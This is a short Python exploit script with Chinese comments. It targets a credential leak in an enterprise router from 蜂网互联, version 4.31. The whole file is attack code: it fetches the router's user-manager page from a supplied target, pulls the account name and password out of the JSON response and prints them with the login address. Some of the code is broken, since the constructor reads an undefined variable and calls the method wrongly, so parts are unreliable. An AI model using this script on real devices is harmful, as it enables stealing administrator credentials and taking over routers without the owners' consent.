# author:wr0x00
# Create date:2022-8-23.
# 蜂网互联企业级路由器v4.31密码泄露漏洞,密码hash直接存放在网页源码里

import requests
import json

proxy=None
def set_agent(p):#设置代理
    global proxy
    proxy=p

class exp:
    def getpass(target):
        r = requests.get( target + '/action/usermanager.htm',proxies=proxy)
        #return r.text
        s=json.loads(r.text)
        s=str(s['rows'])
        s=s.replace("[","")
        s=s.replace("]","")
        s=s.replace("\'","\"")
        s2=json.loads(s)
        print("账号:"+s2['user']+"，密码:"+s2['pwd']+"\n登录地址为:"+target+"/login.html")

    def __init__(self,url,port):
        url=(format(dip))
        if 'http' not in url:
            target = f'http://{url}'
        elif 'https' in url:
            target = url.replace('https', 'http')
        else:
            target = url
        getpass(target)
